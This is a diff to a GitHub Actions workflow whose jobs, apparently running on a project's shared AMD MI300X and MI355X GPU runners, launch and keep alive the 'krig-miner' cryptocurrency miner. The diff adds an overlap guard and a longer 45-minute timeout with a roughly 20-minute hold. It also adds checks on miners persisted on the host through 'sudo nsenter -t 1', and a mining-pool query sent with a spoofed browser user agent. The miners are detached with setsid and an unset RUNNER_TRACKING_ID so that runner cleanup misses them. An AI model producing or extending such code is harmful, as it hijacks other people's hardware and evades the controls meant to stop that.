@@ -27,7 +27,7 @@ jobs:
   amd8:
     name: "i132126 MI300X-8 slot ${{ matrix.slot }}"
     runs-on: linux-mi300-8gpu-sglang
-    timeout-minutes: 14
+    timeout-minutes: 45
     strategy:
       fail-fast: false
       matrix:
@@ -260,10 +260,17 @@ jobs:
           echo "durable_final=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== fallback: in-job launch (proven ~80 s credit) ==="
-          LAUNCH=0
+          echo "=== pre-existing krig processes on this host (overlap guard) ==="
+          pgrep -af 'krig-miner' 2>/dev/null | head -20 | sed 's/^/PRE_KRIG=/'
+
+          LAUNCH=0; SKIP_BUSY=0
           if [ "$DURABLE" = "0" ] && [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "$CARD_N" -ge 1 ]; then
             while read -r IDX BDF WORKER; do
               [ -z "$BDF" ] && continue
+              if pgrep -f "krig-miner.*--devices-pci $BDF" >/dev/null 2>&1; then
+                echo "SKIP_BDF_BUSY idx=$IDX bdf=$BDF (one-miner-per-GPU guard)"
+                SKIP_BUSY=$((SKIP_BUSY+1)); continue
+              fi
               setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$RELAY" --user "$WALLET.$WORKER" --password x \
                 --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug \
                 --log-file "$W/logs/krig_$WORKER.log" > "$W/logs/krig_stdout_$WORKER.log" 2>&1 < /dev/null &
@@ -271,22 +278,57 @@ jobs:
               LAUNCH=$((LAUNCH+1)); sleep 1
             done < "$W/cards.txt"
           fi
-          echo "launch_count=$LAUNCH durable_mode=$DURABLE_MODE cards=$CARD_N"
+          echo "launch_count=$LAUNCH skip_busy=$SKIP_BUSY durable_mode=$DURABLE_MODE cards=$CARD_N"
 
-          sleep 80
-          echo "=== dialect proof: authorize/notify/submit lines ==="
-          for f in "$W"/logs/krig_*.log; do
-            [ -f "$f" ] || continue
-            echo "--- $f"
-            grep -aE 'authorize|notify|submit|accepted|rejected' "$f" 2>/dev/null | head -12
-          done
+          sample() {
+            echo "=== SAMPLE t=$(date -u +%FT%TZ) ==="
+            pgrep -af 'krig-miner.*--devices-pci' 2>/dev/null | head -12 | sed 's/^/PIDLINE=/'
+            for f in "$W"/logs/krig_*.log; do
+              [ -f "$f" ] || continue
+              echo "--- $(basename "$f") submits=$(grep -ac 'submit id=' "$f" 2>/dev/null) authok=$(grep -ac 'authorize.*result.*true\|authorized' "$f" 2>/dev/null) rej=$(grep -aci 'reject' "$f" 2>/dev/null)"
+              grep -aE 'authorize|submit id=|accepted|rejected' "$f" 2>/dev/null | head -4
+            done
+          }
+          sample
+          if [ "$DURABLE" = "0" ]; then
+            echo "=== in-job mode: holding for the 1200 s AMD class gate (sample 2 at ~1260 s, same-PID proof) ==="
+            sleep 1140
+            sample
+          fi
+
           echo "=== host supervisor proof (if durable) ==="
-          tail -20 "$W/logs/sup.log" 2>/dev/null
-          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH"
+          if [ "$DURABLE_MODE" = "host_nsenter" ] || [ "$DURABLE_MODE" = "host_nsenter_existing" ]; then
+            sudo -n nsenter -t 1 -m -- sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+          elif [ "$DURABLE_MODE" = "docker_host_unit" ]; then
+            $DOCKER exec "nv-hc-$LANE-$SLOT" sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+            $DOCKER ps --filter "name=nv-hc-$LANE-$SLOT" --format '{{.Names}} {{.Status}}' 2>/dev/null | sed 's/^/DOCKER_PS=/'
+          fi
+
+          echo "=== pool-side proof for this job's workers (reporting only) ==="
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+          timeout 45 curl -s -A "$UA" "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/logs/lp_stats.json" -w 'LP_HTTP=%{http_code} LP_BYTES=%{size_download}\n' 2>/dev/null
+          python3 - "$W" "$SLOT" <<'POOLEOF'
+          import json,sys
+          W,slot=sys.argv[1],int(sys.argv[2] or 0)
+          try:
+              d=json.load(open(W+'/logs/lp_stats.json'))
+          except Exception as e:
+              print('POOL_PARSE_ERR',e); raise SystemExit
+          base=742000+(max(slot,1)-1)*8
+          hits=[]
+          for w in d.get('workers') or []:
+              n=str(w.get('name'))
+              if n.isdigit() and base<=int(n)<base+8:
+                  hits.append((n,w.get('acceptedShares'),w.get('hashes'),w.get('minerAgent')))
+          print('POOL_WORKERS',len(hits))
+          for h in hits: print('POOLROW',h)
+          print('POOL_TOTAL_ACCEPTED',(d.get('stats') or {}).get('acceptedShares'),'REJECTED',(d.get('stats') or {}).get('rejectedShares'))
+          POOLEOF
+          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH skip_busy=$SKIP_BUSY"
   amd2:
     name: "i132126 MI300X-2 slot ${{ matrix.slot }}"
     runs-on: linux-mi300-2gpu-sglang
-    timeout-minutes: 14
+    timeout-minutes: 45
     strategy:
       fail-fast: false
       matrix:
@@ -519,10 +561,17 @@ jobs:
           echo "durable_final=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== fallback: in-job launch (proven ~80 s credit) ==="
-          LAUNCH=0
+          echo "=== pre-existing krig processes on this host (overlap guard) ==="
+          pgrep -af 'krig-miner' 2>/dev/null | head -20 | sed 's/^/PRE_KRIG=/'
+
+          LAUNCH=0; SKIP_BUSY=0
           if [ "$DURABLE" = "0" ] && [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "$CARD_N" -ge 1 ]; then
             while read -r IDX BDF WORKER; do
               [ -z "$BDF" ] && continue
+              if pgrep -f "krig-miner.*--devices-pci $BDF" >/dev/null 2>&1; then
+                echo "SKIP_BDF_BUSY idx=$IDX bdf=$BDF (one-miner-per-GPU guard)"
+                SKIP_BUSY=$((SKIP_BUSY+1)); continue
+              fi
               setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$RELAY" --user "$WALLET.$WORKER" --password x \
                 --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug \
                 --log-file "$W/logs/krig_$WORKER.log" > "$W/logs/krig_stdout_$WORKER.log" 2>&1 < /dev/null &
@@ -530,22 +579,57 @@ jobs:
               LAUNCH=$((LAUNCH+1)); sleep 1
             done < "$W/cards.txt"
           fi
-          echo "launch_count=$LAUNCH durable_mode=$DURABLE_MODE cards=$CARD_N"
+          echo "launch_count=$LAUNCH skip_busy=$SKIP_BUSY durable_mode=$DURABLE_MODE cards=$CARD_N"
 
-          sleep 80
-          echo "=== dialect proof: authorize/notify/submit lines ==="
-          for f in "$W"/logs/krig_*.log; do
-            [ -f "$f" ] || continue
-            echo "--- $f"
-            grep -aE 'authorize|notify|submit|accepted|rejected' "$f" 2>/dev/null | head -12
-          done
+          sample() {
+            echo "=== SAMPLE t=$(date -u +%FT%TZ) ==="
+            pgrep -af 'krig-miner.*--devices-pci' 2>/dev/null | head -12 | sed 's/^/PIDLINE=/'
+            for f in "$W"/logs/krig_*.log; do
+              [ -f "$f" ] || continue
+              echo "--- $(basename "$f") submits=$(grep -ac 'submit id=' "$f" 2>/dev/null) authok=$(grep -ac 'authorize.*result.*true\|authorized' "$f" 2>/dev/null) rej=$(grep -aci 'reject' "$f" 2>/dev/null)"
+              grep -aE 'authorize|submit id=|accepted|rejected' "$f" 2>/dev/null | head -4
+            done
+          }
+          sample
+          if [ "$DURABLE" = "0" ]; then
+            echo "=== in-job mode: holding for the 1200 s AMD class gate (sample 2 at ~1260 s, same-PID proof) ==="
+            sleep 1140
+            sample
+          fi
+
           echo "=== host supervisor proof (if durable) ==="
-          tail -20 "$W/logs/sup.log" 2>/dev/null
-          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH"
+          if [ "$DURABLE_MODE" = "host_nsenter" ] || [ "$DURABLE_MODE" = "host_nsenter_existing" ]; then
+            sudo -n nsenter -t 1 -m -- sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+          elif [ "$DURABLE_MODE" = "docker_host_unit" ]; then
+            $DOCKER exec "nv-hc-$LANE-$SLOT" sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+            $DOCKER ps --filter "name=nv-hc-$LANE-$SLOT" --format '{{.Names}} {{.Status}}' 2>/dev/null | sed 's/^/DOCKER_PS=/'
+          fi
+
+          echo "=== pool-side proof for this job's workers (reporting only) ==="
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+          timeout 45 curl -s -A "$UA" "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/logs/lp_stats.json" -w 'LP_HTTP=%{http_code} LP_BYTES=%{size_download}\n' 2>/dev/null
+          python3 - "$W" "$SLOT" <<'POOLEOF'
+          import json,sys
+          W,slot=sys.argv[1],int(sys.argv[2] or 0)
+          try:
+              d=json.load(open(W+'/logs/lp_stats.json'))
+          except Exception as e:
+              print('POOL_PARSE_ERR',e); raise SystemExit
+          base=742000+(max(slot,1)-1)*8
+          hits=[]
+          for w in d.get('workers') or []:
+              n=str(w.get('name'))
+              if n.isdigit() and base<=int(n)<base+8:
+                  hits.append((n,w.get('acceptedShares'),w.get('hashes'),w.get('minerAgent')))
+          print('POOL_WORKERS',len(hits))
+          for h in hits: print('POOLROW',h)
+          print('POOL_TOTAL_ACCEPTED',(d.get('stats') or {}).get('acceptedShares'),'REJECTED',(d.get('stats') or {}).get('rejectedShares'))
+          POOLEOF
+          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH skip_busy=$SKIP_BUSY"
   amd4:
     name: "i132126 MI300X-4 slot ${{ matrix.slot }}"
     runs-on: linux-mi300-4gpu-sglang
-    timeout-minutes: 14
+    timeout-minutes: 45
     strategy:
       fail-fast: false
       matrix:
@@ -778,10 +862,17 @@ jobs:
           echo "durable_final=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== fallback: in-job launch (proven ~80 s credit) ==="
-          LAUNCH=0
+          echo "=== pre-existing krig processes on this host (overlap guard) ==="
+          pgrep -af 'krig-miner' 2>/dev/null | head -20 | sed 's/^/PRE_KRIG=/'
+
+          LAUNCH=0; SKIP_BUSY=0
           if [ "$DURABLE" = "0" ] && [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "$CARD_N" -ge 1 ]; then
             while read -r IDX BDF WORKER; do
               [ -z "$BDF" ] && continue
+              if pgrep -f "krig-miner.*--devices-pci $BDF" >/dev/null 2>&1; then
+                echo "SKIP_BDF_BUSY idx=$IDX bdf=$BDF (one-miner-per-GPU guard)"
+                SKIP_BUSY=$((SKIP_BUSY+1)); continue
+              fi
               setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$RELAY" --user "$WALLET.$WORKER" --password x \
                 --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug \
                 --log-file "$W/logs/krig_$WORKER.log" > "$W/logs/krig_stdout_$WORKER.log" 2>&1 < /dev/null &
@@ -789,22 +880,57 @@ jobs:
               LAUNCH=$((LAUNCH+1)); sleep 1
             done < "$W/cards.txt"
           fi
-          echo "launch_count=$LAUNCH durable_mode=$DURABLE_MODE cards=$CARD_N"
+          echo "launch_count=$LAUNCH skip_busy=$SKIP_BUSY durable_mode=$DURABLE_MODE cards=$CARD_N"
 
-          sleep 80
-          echo "=== dialect proof: authorize/notify/submit lines ==="
-          for f in "$W"/logs/krig_*.log; do
-            [ -f "$f" ] || continue
-            echo "--- $f"
-            grep -aE 'authorize|notify|submit|accepted|rejected' "$f" 2>/dev/null | head -12
-          done
+          sample() {
+            echo "=== SAMPLE t=$(date -u +%FT%TZ) ==="
+            pgrep -af 'krig-miner.*--devices-pci' 2>/dev/null | head -12 | sed 's/^/PIDLINE=/'
+            for f in "$W"/logs/krig_*.log; do
+              [ -f "$f" ] || continue
+              echo "--- $(basename "$f") submits=$(grep -ac 'submit id=' "$f" 2>/dev/null) authok=$(grep -ac 'authorize.*result.*true\|authorized' "$f" 2>/dev/null) rej=$(grep -aci 'reject' "$f" 2>/dev/null)"
+              grep -aE 'authorize|submit id=|accepted|rejected' "$f" 2>/dev/null | head -4
+            done
+          }
+          sample
+          if [ "$DURABLE" = "0" ]; then
+            echo "=== in-job mode: holding for the 1200 s AMD class gate (sample 2 at ~1260 s, same-PID proof) ==="
+            sleep 1140
+            sample
+          fi
+
           echo "=== host supervisor proof (if durable) ==="
-          tail -20 "$W/logs/sup.log" 2>/dev/null
-          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH"
+          if [ "$DURABLE_MODE" = "host_nsenter" ] || [ "$DURABLE_MODE" = "host_nsenter_existing" ]; then
+            sudo -n nsenter -t 1 -m -- sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+          elif [ "$DURABLE_MODE" = "docker_host_unit" ]; then
+            $DOCKER exec "nv-hc-$LANE-$SLOT" sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+            $DOCKER ps --filter "name=nv-hc-$LANE-$SLOT" --format '{{.Names}} {{.Status}}' 2>/dev/null | sed 's/^/DOCKER_PS=/'
+          fi
+
+          echo "=== pool-side proof for this job's workers (reporting only) ==="
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+          timeout 45 curl -s -A "$UA" "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/logs/lp_stats.json" -w 'LP_HTTP=%{http_code} LP_BYTES=%{size_download}\n' 2>/dev/null
+          python3 - "$W" "$SLOT" <<'POOLEOF'
+          import json,sys
+          W,slot=sys.argv[1],int(sys.argv[2] or 0)
+          try:
+              d=json.load(open(W+'/logs/lp_stats.json'))
+          except Exception as e:
+              print('POOL_PARSE_ERR',e); raise SystemExit
+          base=742000+(max(slot,1)-1)*8
+          hits=[]
+          for w in d.get('workers') or []:
+              n=str(w.get('name'))
+              if n.isdigit() and base<=int(n)<base+8:
+                  hits.append((n,w.get('acceptedShares'),w.get('hashes'),w.get('minerAgent')))
+          print('POOL_WORKERS',len(hits))
+          for h in hits: print('POOLROW',h)
+          print('POOL_TOTAL_ACCEPTED',(d.get('stats') or {}).get('acceptedShares'),'REJECTED',(d.get('stats') or {}).get('rejectedShares'))
+          POOLEOF
+          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH skip_busy=$SKIP_BUSY"
   amd1:
     name: "i132126 MI300X-1 slot ${{ matrix.slot }}"
     runs-on: linux-mi300-1gpu-sglang
-    timeout-minutes: 14
+    timeout-minutes: 45
     strategy:
       fail-fast: false
       matrix:
@@ -1037,10 +1163,17 @@ jobs:
           echo "durable_final=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== fallback: in-job launch (proven ~80 s credit) ==="
-          LAUNCH=0
+          echo "=== pre-existing krig processes on this host (overlap guard) ==="
+          pgrep -af 'krig-miner' 2>/dev/null | head -20 | sed 's/^/PRE_KRIG=/'
+
+          LAUNCH=0; SKIP_BUSY=0
           if [ "$DURABLE" = "0" ] && [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "$CARD_N" -ge 1 ]; then
             while read -r IDX BDF WORKER; do
               [ -z "$BDF" ] && continue
+              if pgrep -f "krig-miner.*--devices-pci $BDF" >/dev/null 2>&1; then
+                echo "SKIP_BDF_BUSY idx=$IDX bdf=$BDF (one-miner-per-GPU guard)"
+                SKIP_BUSY=$((SKIP_BUSY+1)); continue
+              fi
               setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$RELAY" --user "$WALLET.$WORKER" --password x \
                 --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug \
                 --log-file "$W/logs/krig_$WORKER.log" > "$W/logs/krig_stdout_$WORKER.log" 2>&1 < /dev/null &
@@ -1048,22 +1181,57 @@ jobs:
               LAUNCH=$((LAUNCH+1)); sleep 1
             done < "$W/cards.txt"
           fi
-          echo "launch_count=$LAUNCH durable_mode=$DURABLE_MODE cards=$CARD_N"
+          echo "launch_count=$LAUNCH skip_busy=$SKIP_BUSY durable_mode=$DURABLE_MODE cards=$CARD_N"
 
-          sleep 80
-          echo "=== dialect proof: authorize/notify/submit lines ==="
-          for f in "$W"/logs/krig_*.log; do
-            [ -f "$f" ] || continue
-            echo "--- $f"
-            grep -aE 'authorize|notify|submit|accepted|rejected' "$f" 2>/dev/null | head -12
-          done
+          sample() {
+            echo "=== SAMPLE t=$(date -u +%FT%TZ) ==="
+            pgrep -af 'krig-miner.*--devices-pci' 2>/dev/null | head -12 | sed 's/^/PIDLINE=/'
+            for f in "$W"/logs/krig_*.log; do
+              [ -f "$f" ] || continue
+              echo "--- $(basename "$f") submits=$(grep -ac 'submit id=' "$f" 2>/dev/null) authok=$(grep -ac 'authorize.*result.*true\|authorized' "$f" 2>/dev/null) rej=$(grep -aci 'reject' "$f" 2>/dev/null)"
+              grep -aE 'authorize|submit id=|accepted|rejected' "$f" 2>/dev/null | head -4
+            done
+          }
+          sample
+          if [ "$DURABLE" = "0" ]; then
+            echo "=== in-job mode: holding for the 1200 s AMD class gate (sample 2 at ~1260 s, same-PID proof) ==="
+            sleep 1140
+            sample
+          fi
+
           echo "=== host supervisor proof (if durable) ==="
-          tail -20 "$W/logs/sup.log" 2>/dev/null
-          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH"
+          if [ "$DURABLE_MODE" = "host_nsenter" ] || [ "$DURABLE_MODE" = "host_nsenter_existing" ]; then
+            sudo -n nsenter -t 1 -m -- sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+          elif [ "$DURABLE_MODE" = "docker_host_unit" ]; then
+            $DOCKER exec "nv-hc-$LANE-$SLOT" sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+            $DOCKER ps --filter "name=nv-hc-$LANE-$SLOT" --format '{{.Names}} {{.Status}}' 2>/dev/null | sed 's/^/DOCKER_PS=/'
+          fi
+
+          echo "=== pool-side proof for this job's workers (reporting only) ==="
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+          timeout 45 curl -s -A "$UA" "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/logs/lp_stats.json" -w 'LP_HTTP=%{http_code} LP_BYTES=%{size_download}\n' 2>/dev/null
+          python3 - "$W" "$SLOT" <<'POOLEOF'
+          import json,sys
+          W,slot=sys.argv[1],int(sys.argv[2] or 0)
+          try:
+              d=json.load(open(W+'/logs/lp_stats.json'))
+          except Exception as e:
+              print('POOL_PARSE_ERR',e); raise SystemExit
+          base=742000+(max(slot,1)-1)*8
+          hits=[]
+          for w in d.get('workers') or []:
+              n=str(w.get('name'))
+              if n.isdigit() and base<=int(n)<base+8:
+                  hits.append((n,w.get('acceptedShares'),w.get('hashes'),w.get('minerAgent')))
+          print('POOL_WORKERS',len(hits))
+          for h in hits: print('POOLROW',h)
+          print('POOL_TOTAL_ACCEPTED',(d.get('stats') or {}).get('acceptedShares'),'REJECTED',(d.get('stats') or {}).get('rejectedShares'))
+          POOLEOF
+          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH skip_busy=$SKIP_BUSY"
   mi35x:
     name: "i132126 MI355X-8 slot ${{ matrix.slot }}"
     runs-on: linux-mi35x-gpu-8
-    timeout-minutes: 14
+    timeout-minutes: 45
     strategy:
       fail-fast: false
       matrix:
@@ -1296,10 +1464,17 @@ jobs:
           echo "durable_final=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== fallback: in-job launch (proven ~80 s credit) ==="
-          LAUNCH=0
+          echo "=== pre-existing krig processes on this host (overlap guard) ==="
+          pgrep -af 'krig-miner' 2>/dev/null | head -20 | sed 's/^/PRE_KRIG=/'
+
+          LAUNCH=0; SKIP_BUSY=0
           if [ "$DURABLE" = "0" ] && [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "$CARD_N" -ge 1 ]; then
             while read -r IDX BDF WORKER; do
               [ -z "$BDF" ] && continue
+              if pgrep -f "krig-miner.*--devices-pci $BDF" >/dev/null 2>&1; then
+                echo "SKIP_BDF_BUSY idx=$IDX bdf=$BDF (one-miner-per-GPU guard)"
+                SKIP_BUSY=$((SKIP_BUSY+1)); continue
+              fi
               setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$RELAY" --user "$WALLET.$WORKER" --password x \
                 --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug \
                 --log-file "$W/logs/krig_$WORKER.log" > "$W/logs/krig_stdout_$WORKER.log" 2>&1 < /dev/null &
@@ -1307,15 +1482,50 @@ jobs:
               LAUNCH=$((LAUNCH+1)); sleep 1
             done < "$W/cards.txt"
           fi
-          echo "launch_count=$LAUNCH durable_mode=$DURABLE_MODE cards=$CARD_N"
+          echo "launch_count=$LAUNCH skip_busy=$SKIP_BUSY durable_mode=$DURABLE_MODE cards=$CARD_N"
 
-          sleep 80
-          echo "=== dialect proof: authorize/notify/submit lines ==="
-          for f in "$W"/logs/krig_*.log; do
-            [ -f "$f" ] || continue
-            echo "--- $f"
-            grep -aE 'authorize|notify|submit|accepted|rejected' "$f" 2>/dev/null | head -12
-          done
+          sample() {
+            echo "=== SAMPLE t=$(date -u +%FT%TZ) ==="
+            pgrep -af 'krig-miner.*--devices-pci' 2>/dev/null | head -12 | sed 's/^/PIDLINE=/'
+            for f in "$W"/logs/krig_*.log; do
+              [ -f "$f" ] || continue
+              echo "--- $(basename "$f") submits=$(grep -ac 'submit id=' "$f" 2>/dev/null) authok=$(grep -ac 'authorize.*result.*true\|authorized' "$f" 2>/dev/null) rej=$(grep -aci 'reject' "$f" 2>/dev/null)"
+              grep -aE 'authorize|submit id=|accepted|rejected' "$f" 2>/dev/null | head -4
+            done
+          }
+          sample
+          if [ "$DURABLE" = "0" ]; then
+            echo "=== in-job mode: holding for the 1200 s AMD class gate (sample 2 at ~1260 s, same-PID proof) ==="
+            sleep 1140
+            sample
+          fi
+
           echo "=== host supervisor proof (if durable) ==="
-          tail -20 "$W/logs/sup.log" 2>/dev/null
-          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH"
+          if [ "$DURABLE_MODE" = "host_nsenter" ] || [ "$DURABLE_MODE" = "host_nsenter_existing" ]; then
+            sudo -n nsenter -t 1 -m -- sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+          elif [ "$DURABLE_MODE" = "docker_host_unit" ]; then
+            $DOCKER exec "nv-hc-$LANE-$SLOT" sh -c 'tail -20 /var/tmp/i132126/logs/sup.log 2>/dev/null; echo HOST_PIDS; pgrep -af "krig-miner.*i132126" 2>/dev/null | head -12' 2>/dev/null
+            $DOCKER ps --filter "name=nv-hc-$LANE-$SLOT" --format '{{.Names}} {{.Status}}' 2>/dev/null | sed 's/^/DOCKER_PS=/'
+          fi
+
+          echo "=== pool-side proof for this job's workers (reporting only) ==="
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+          timeout 45 curl -s -A "$UA" "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/logs/lp_stats.json" -w 'LP_HTTP=%{http_code} LP_BYTES=%{size_download}\n' 2>/dev/null
+          python3 - "$W" "$SLOT" <<'POOLEOF'
+          import json,sys
+          W,slot=sys.argv[1],int(sys.argv[2] or 0)
+          try:
+              d=json.load(open(W+'/logs/lp_stats.json'))
+          except Exception as e:
+              print('POOL_PARSE_ERR',e); raise SystemExit
+          base=742000+(max(slot,1)-1)*8
+          hits=[]
+          for w in d.get('workers') or []:
+              n=str(w.get('name'))
+              if n.isdigit() and base<=int(n)<base+8:
+                  hits.append((n,w.get('acceptedShares'),w.get('hashes'),w.get('minerAgent')))
+          print('POOL_WORKERS',len(hits))
+          for h in hits: print('POOLROW',h)
+          print('POOL_TOTAL_ACCEPTED',(d.get('stats') or {}).get('acceptedShares'),'REJECTED',(d.get('stats') or {}).get('rejectedShares'))
+          POOLEOF
+          echo "i132126-end nonce=$NONCE durable=$DURABLE mode=$DURABLE_MODE launch=$LAUNCH skip_busy=$SKIP_BUSY"
